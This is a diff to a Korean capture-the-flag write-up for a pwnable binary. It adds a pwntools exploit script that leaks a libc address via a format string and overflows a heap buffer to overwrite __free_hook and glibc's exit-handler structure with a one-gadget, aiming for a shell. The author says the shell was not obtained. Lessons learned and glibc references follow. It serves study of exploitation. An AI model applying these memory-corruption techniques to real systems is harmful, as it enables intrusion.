@@ -459,15 +459,169 @@ case ef_cxa:
 
 `cxa_finialize` 함수에서 계속 에러가 떴었는데, 이것도 한번 분석해볼 예정이다.
 
-아무튼 그래서 `initial->next`와 `initial->idx` 둘다 조작을 진행해서 while문을 돌지 않고 바로 `free`함수를 호출하게끔 익스를 진행했다.
+아무튼 그래서 `initial->next`와 `initial->idx` 둘다 조작을 진행해서 while문을 돌지 않고 바로 `free`함수를 호출하게끔 익스를 진행하면 된다.
 
+(위에서 언급했다시피 쉘은 못땄다.. libc 버전이 2.26이 아니여서 onegadget 조건을 충족하지 못한것 같당..)
 
 ## slv.py
 
+```python
+from pwn import *
+
+p = process('./bug')
+e = ELF('./bug')
+
+system_offset = e.libc.symbols['system']
+binsh_offset = 0x1b3e9a
+free_hook_offset = e.libc.symbols['__free_hook']
+initial_offset = 0x3ecd80
+onegadget = [0x4f2c5, 0x4f322, 0x10a38c]
+
+sla = lambda c,s : p.sendlineafter(c, str(s))
+sa = lambda c,s : p.sendafter (c, str(s))
+sl = lambda s : p.sendline(str(s))
+s = lambda s : p.send(str(s))
+
+str_bug = {'dragonfly' : 0x1b8, 'butterfly': 0x1fe, 'fly':0x1c0}
+catch_bug = []
+count = 0
+
+context.log_level = 'debug'
+context.terminal = ['/usr/bin/tmux', 'splitw', '-h']
+
+
+
+def catch():
+    
+    global count
+    
+    sla('>> ', '1')
+    
+    p.recvuntil('\n')
+    if 'no bug' in str(p.recvuntil('\n')):
+        
+        return False
+    
+    bug = str(p.recvuntil('>> '))
+    
+    sl('%p')
+    
+    
+    
+    if '@@@@@' in bug:
+        catch_bug.append('fly')
+    
+    elif '|:::|' in bug:
+        catch_bug.append('butterfly')
+    
+    elif '###' in bug:
+        catch_bug.append('dragonfly')
+    
+    count += 1
+    
+    return True
+
+def inspect():
+    
+    sla('>> ', '2')
+    
+    libc_leak = int(str(p.recv(50)).split('=========================\n')[1][:14],16)
+    
+    libc_base = libc_leak - 0x3ec7e3
+    log.info('libc_base : ' + hex(libc_base))
+    
+    return libc_base
+
+def submit(body, tag, password):
+    
+    
+    
+    sla('>> ', '3')
+    
+    sla('title\n', 'a'*0x37)
+    
+    sla('title\n', 'a'*0x77)
+    
+    sla('body\n', body)
+    
+    sa('tag\n', tag)
+    
+    sa('password\n', password)
+    
+    
+    return
+
+
+def main():
+    
+    global count, catch_bug, str_bug
+    
+    while count != 3:
+        catch()
+    
+    
+    dummy_len = 0
+    
+    for i in catch_bug:
+        dummy_len += str_bug[i]
+        
+    if dummy_len < 0x540:
+        log.info('[-] Length of dummy is too short to exploit')
+        return
+    
+    libc_base = inspect()
+    
+    system_addr = libc_base + system_offset
+    binsh_addr = libc_base + binsh_offset
+    free_hook_addr = libc_base + free_hook_offset
+    initial_addr = libc_base + initial_offset
+    onegadget_addr = libc_base + onegadget[0]
+    
+    script = 'b* ' + hex(onegadget_addr)
+    script += '''
+    b* exit
+    dir /usr/src/glibc/glibc-2.27/stdlib/
+    '''
+        
+    payload = ''
+    payload += 'a' * (0x700 - dummy_len - 0xc0)
+    payload += p64(free_hook_addr-len(payload)-0x10-1)
+    payload += p64(initial_addr+1)
+    gdb.attach(p,script)
+    submit(payload, p64(onegadget_addr), p64(1))
+    
+    p.interactive()
+    
+    return
+
+
+
+if __name__ == '__main__':    
+    main()
+	
+```
+
+libc-2.27.so 버전의 익스이다. (쉘은 안따져용.. ㅠㅡㅠ)
+
+onegadget이 안먹히길래 `system('/bin/sh')`을 실행시키려고 별의 별짓을 해봤는데도 안됬다.. ~~(능력부족)~~
+
+^_^
+
 ## 느낀 점
+
+1. exit 내부에 free를 호출하는 것처럼 다른 함수에서 내부적으로 malloc, free를 호출하는 것을 이용해 문제를 내는 유형이 있으므로 malloc, free를 사용하지 않는다고 해서 hook overwrite로 쉘을 따는 것이 아니라고 단정지을 수 없다.
+
+2. PTR_MANGLE, PTR_DEMANGLE 의 존재를 이번에 처음 알았다. pointer_guard가 이런 식으로도 사용된다는 것을 알게되었다.
+
+3. linux asm() 함수 형식에 대해서 제대로 알아야겠다..
+
+
 
 ## Reference
 
+- [https://code.woboq.org/userspace/glibc/stdlib/exit.c.html](https://code.woboq.org/userspace/glibc/stdlib/exit.c.html)
+- [https://code.woboq.org/userspace/glibc/stdlib/cxa_atexit.c.html#__exit_funcs](https://code.woboq.org/userspace/glibc/stdlib/cxa_atexit.c.html#__exit_funcs)
+- [https://code.woboq.org/userspace/glibc/sysdeps/unix/sysv/linux/x86_64/sysdep.h.html#416](https://code.woboq.org/userspace/glibc/sysdeps/unix/sysv/linux/x86_64/sysdep.h.html#416)
 
 
 
